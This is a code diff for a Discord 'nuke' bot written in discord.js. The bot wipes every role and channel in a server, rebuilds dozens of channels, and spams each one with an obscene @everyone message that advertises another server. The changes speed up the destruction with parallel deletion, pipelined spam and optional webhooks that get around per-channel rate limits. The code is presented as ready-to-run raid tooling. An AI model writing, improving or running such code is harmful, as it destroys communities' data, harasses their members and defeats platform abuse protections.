@@ -1,16 +1,14 @@
 import 'dotenv/config';
 import {
   Client, GatewayIntentBits, Events, ChannelType, MessageFlags,
-  PermissionFlagsBits,
+  PermissionFlagsBits, Routes,
 } from 'discord.js';
 
 /* ------------------------------------------------------------------ config */
 
-// always posted after a nuke — edit this line to change the text
 const NUKE_MESSAGE =
   "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS #";
 
-// base name for every rebuilt channel
 const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';
 
 // false -> "name", "name 1", "name 2", ...
@@ -18,60 +16,36 @@ const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';
 const NUMBER_FIRST_CHANNEL = false;
 
 const CATEGORY_NAME = 'general';
-const TEXT_COUNT    = 25;   // how many text channels to create
-const VOICE_COUNT   = 15;   // how many voice channels to create
-const SPAM_COUNT    = 45;   // how many times the message gets spammed PER CHANNEL
+const TEXT_COUNT    = 25;
+const VOICE_COUNT   = 15;
+const SPAM_COUNT    = 45;   // messages per text channel
 
-// optional: a role NAME that may also nuke, on ANY server (admins always can).
-const NUKE_ROLE_NAME = '';
+// optional: role NAME that may also nuke (admins always can). now read from .env
+const NUKE_ROLE_NAME = process.env.NUKE_ROLE_NAME ?? '';
 
-/* ------------------------------------------------------------- speed knobs */
+/* --------------------------------------------------------- speed knobs */
 
-// delay between channel create/delete ops (Discord channel rate limit)
-const CHANNEL_DELAY = 50;
+// how many ops run at the exact same time. discord.js queues + backs off 429s
+// per bucket, so these are just "how wide do we fire", not rate-limit values.
+const DELETE_CONCURRENCY = 10;  // channel/role deletions in flight
+const CREATE_CONCURRENCY = 5;   // channel creations in flight
 
-// delay between two messages inside the SAME channel
-const SEND_DELAY = 12;
+// 0 = fire all SPAM_COUNT at once and let the REST queue meter them (fastest).
+// set e.g. 10 if you want visible batching instead.
+const SPAM_BURST = 0;
 
-// how many channels may fire at the exact same moment
-const SEND_CONCURRENCY = 25;
+// true = split every channel's spam between the bot AND a per-channel webhook.
+// bot = 5 msg / 5s per channel, webhook = 5 msg / 2s per webhook -> two
+// independent buckets, roughly 2.5x faster overall. messages then show as a
+// "nuke" webhook instead of your bot. set WEBHOOK_RATIO to taste.
+const USE_WEBHOOKS = false;
+const WEBHOOK_RATIO = 0.5;
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-// "name" for the first channel, "name 1", "name 2", ... for the rest
 function channelName(i) {
   const n = NUMBER_FIRST_CHANNEL ? i + 1 : i;
   return n === 0 ? CHANNEL_BASE : `${CHANNEL_BASE} ${n}`;
-}
-
-// send with automatic 429 backoff so nothing gets dropped when we blast
-async function sendSafe(channel, content, retries = 6) {
-  try {
-    await channel.send(content);
-  } catch (err) {
-    const status = err?.status ?? err?.httpStatus;
-    if (status === 429 && retries > 0) {
-      const wait = ((err.retryAfter ?? err?.data?.retry_after ?? 1) * 1000) + 150;
-      await sleep(wait);
-      return sendSafe(channel, content, retries - 1);
-    }
-    console.error('[send]', channel.name, err.message);
-  }
-}
-
-// create with automatic 429 backoff
-async function createSafe(guild, options, retries = 5) {
-  try {
-    return await guild.channels.create(options);
-  } catch (err) {
-    const status = err?.status ?? err?.httpStatus;
-    if (status === 429 && retries > 0) {
-      const wait = ((err.retryAfter ?? err?.data?.retry_after ?? 1) * 1000) + 100;
-      await sleep(wait);
-      return createSafe(guild, options, retries - 1);
-    }
-    throw err;
-  }
 }
 
 // run `worker` over `items` with a fixed concurrency ceiling
@@ -88,7 +62,84 @@ async function pool(items, limit, worker) {
   );
 }
 
-const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+const client = new Client({
+  intents: [GatewayIntentBits.Guilds],
+  rest: { retries: 5, timeout: 30_000 },   // ride out long channel-create 429s
+});
+
+/* --------------------------------------------------------------- senders */
+
+// sender = { channel } or { webhook: url }
+async function sendSafe(sender, content, retries = 6) {
+  try {
+    if (sender.webhook) {
+      await client.rest.post(sender.webhook, {
+        body: { content, allowed_mentions: { parse: ['everyone'] } },
+        query: { wait: 'false' },           // don't wait for the message object
+      });
+    } else {
+      await sender.channel.send({ content });
+    }
+  } catch (err) {
+    const status = err?.status ?? err?.httpStatus;
+    if (status === 429 && retries > 0) {
+      const wait = ((err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000) + 120;
+      await sleep(wait);
+      return sendSafe(sender, content, retries - 1);
+    }
+    if (status === 404) return;             // channel/webhook got deleted
+    console.error('[send]', err.message);
+  }
+}
+
+async function createSafe(guild, options, retries = 6) {
+  try {
+    return await guild.channels.create(options);
+  } catch (err) {
+    const status = err?.status ?? err?.httpStatus;
+    if (status === 429 && retries > 0) {
+      const wait = ((err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000) + 120;
+      await sleep(wait);
+      return createSafe(guild, options, retries - 1);
+    }
+    throw err;
+  }
+}
+
+/* ------------------------------------------------------------------ spam */
+
+// fires every send for ONE channel without awaiting them one by one
+async function spamChannel(channel) {
+  const senders = [];
+
+  if (USE_WEBHOOKS) {
+    try {
+      const hook = await client.rest.post(Routes.channelWebhooks(channel.id), {
+        body: { name: 'nuke' },
+      });
+      senders.push({
+        webhook: `https://discord.com/api/v10/webhooks/${hook.id}/${hook.token}`,
+      });
+    } catch (err) {
+      console.error('[webhook]', channel.name, err.message);
+    }
+  }
+
+  senders.push({ channel });
+
+  const jobs = [];
+  for (let i = 0; i < SPAM_COUNT; i++) {
+    jobs.push(sendSafe(senders[i % senders.length], NUKE_MESSAGE));
+  }
+
+  if (SPAM_BURST > 0) {
+    for (let i = 0; i < jobs.length; i += SPAM_BURST) {
+      await Promise.all(jobs.slice(i, i + SPAM_BURST));
+    }
+  } else {
+    await Promise.all(jobs);
+  }
+}
 
 /* ------------------------------------------------------------------ events */
 
@@ -106,10 +157,7 @@ client.on(Events.InteractionCreate, async interaction => {
     if (interaction.commandName === 'nuke') return await nuke(interaction);
   } catch (err) {
     console.error(err);
-    const payload = {
-      content: `Error: \`${err.message}\``,
-      flags: MessageFlags.Ephemeral,
-    };
+    const payload = { content: `Error: \`${err.message}\``, flags: MessageFlags.Ephemeral };
     if (interaction.deferred || interaction.replied) {
       await interaction.editReply(payload).catch(() => {});
     } else {
@@ -136,13 +184,8 @@ async function help(interaction) {
 async function nuke(interaction) {
   const { guild } = interaction;
   if (!guild) {
-    return interaction.reply({
-      content: 'Run this inside a server.',
-      flags: MessageFlags.Ephemeral,
-    });
+    return interaction.reply({ content: 'Run this inside a server.', flags: MessageFlags.Ephemeral });
   }
-
-  /* ----- who is allowed to nuke? admins always, plus optional role name ----- */
 
   const isAdmin = interaction.memberPermissions.has(PermissionFlagsBits.Administrator);
   const hasRole =
@@ -163,76 +206,71 @@ async function nuke(interaction) {
   await interaction.deferReply({ flags: MessageFlags.Ephemeral });
 
   const me = guild.members.me;
-
   if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
     return interaction.editReply('I need the **Manage Channels** permission.');
   }
 
-  // 1. roles (optional)
+  const t0 = Date.now();
+  const log = m => console.log(`[nuke +${Date.now() - t0}ms] ${m}`);
+
+  /* 1. roles (optional) — all in flight at once */
   if (wipeRoles) {
     if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
-      console.warn('Skipping roles: missing Manage Roles.');
+      log('skipping roles: missing Manage Roles');
     } else {
-      for (const role of [...guild.roles.cache.values()]) {
-        if (role.managed) continue;                                   // bot/integration roles
-        if (role.id === guild.id) continue;                           // @everyone
-        if (role.comparePositionTo(me.roles.highest) >= 0) continue;  // higher than us
-        await role.delete().catch(e => console.error('[role]', role.name, e.message));
-        await sleep(CHANNEL_DELAY);
-      }
+      const roles = [...guild.roles.cache.values()].filter(
+        r => !r.managed && r.id !== guild.id && r.comparePositionTo(me.roles.highest) < 0
+      );
+      await pool(roles, DELETE_CONCURRENCY, r =>
+        r.delete().catch(e => console.error('[role]', r.name, e.message))
+      );
+      log(`deleted ${roles.length} roles`);
     }
   }
 
-  // 2. wipe every existing channel — snapshot first, the cache mutates as we delete
-  for (const channel of [...guild.channels.cache.values()]) {
-    await channel.delete().catch(e => console.error('[delete]', channel.name, e.message));
-    await sleep(CHANNEL_DELAY);
-  }
+  /* 2. wipe everything in parallel — fetch first so big guilds are complete */
+  const existing = await guild.channels.fetch().catch(() => guild.channels.cache);
+  await pool([...existing.values()], DELETE_CONCURRENCY, c =>
+    c.delete().catch(e => console.error('[delete]', c.name, e.message))
+  );
+  log(`deleted ${existing.size} channels`);
 
-  // 3. rebuild — category + numbered channels
+  /* 3. category (must exist before its children) */
   const category = await createSafe(guild, {
     name: CATEGORY_NAME,
     type: ChannelType.GuildCategory,
   });
-  await sleep(CHANNEL_DELAY);
 
+  /* 4. create + spam PIPELINE: each text channel starts blasting the moment it
+        exists, while the remaining channels are still being created */
+  const specs = [
+    ...Array.from({ length: TEXT_COUNT },  (_, i) => ({ name: channelName(i), type: ChannelType.GuildText })),
+    ...Array.from({ length: VOICE_COUNT }, (_, i) => ({ name: channelName(i), type: ChannelType.GuildVoice })),
+  ];
+
+  const spamJobs = [];
   const textChannels = [];
-  for (let i = 0; i < TEXT_COUNT; i++) {
-    const ch = await createSafe(guild, {
-      name: channelName(i),
-      type: ChannelType.GuildText,
-      parent: category.id,
-    });
-    textChannels.push(ch);
-    await sleep(CHANNEL_DELAY);
-  }
 
-  for (let i = 0; i < VOICE_COUNT; i++) {
-    await createSafe(guild, {
-      name: channelName(i),
-      type: ChannelType.GuildVoice,
-      parent: category.id,
-    });
-    await sleep(CHANNEL_DELAY);
-  }
+  await pool(specs, CREATE_CONCURRENCY, async spec => {
+    const ch = await createSafe(guild, { ...spec, parent: category.id });
+    if (spec.type === ChannelType.GuildText) {
+      textChannels.push(ch);
+      spamJobs.push(spamChannel(ch));   // <- launched, not awaited
+    }
+  });
 
-  // 4. NUKE every text channel at the same time
-  if (textChannels.length) {
-    await pool(textChannels, SEND_CONCURRENCY, async ch => {
-      for (let i = 0; i < SPAM_COUNT; i++) {
-        await sendSafe(ch, NUKE_MESSAGE);
-        if (i < SPAM_COUNT - 1) await sleep(SEND_DELAY);
-      }
-    });
-  }
+  log(`rebuilt ${specs.length} channels — ${spamJobs.length} spam jobs running`);
+  await Promise.all(spamJobs);
 
-  // the origin channel is gone by now, so this can fail harmlessly
-  await interaction
-    .editReply(
-      `Done. Wiped everything, rebuilt ${TEXT_COUNT} text + ${VOICE_COUNT} voice, ` +
-      `spammed ${SPAM_COUNT}x in ${textChannels.length} channels.`
-    )
-    .catch(() => {});
+  const summary =
+    `Done in ${((Date.now() - t0) / 1000).toFixed(1)}s — wiped everything, rebuilt ` +
+    `${TEXT_COUNT} text + ${VOICE_COUNT} voice, spammed ${SPAM_COUNT}x in ${textChannels.length} channels.`;
+  log(summary);
+
+  // origin channel no longer exists, so the ephemeral reply is gone -> fall back
+  await interaction.editReply(summary).catch(async () => {
+    await textChannels[0]?.send(summary).catch(() => {});
+  });
 }
 
 client.login(process.env.DISCORD_TOKEN);
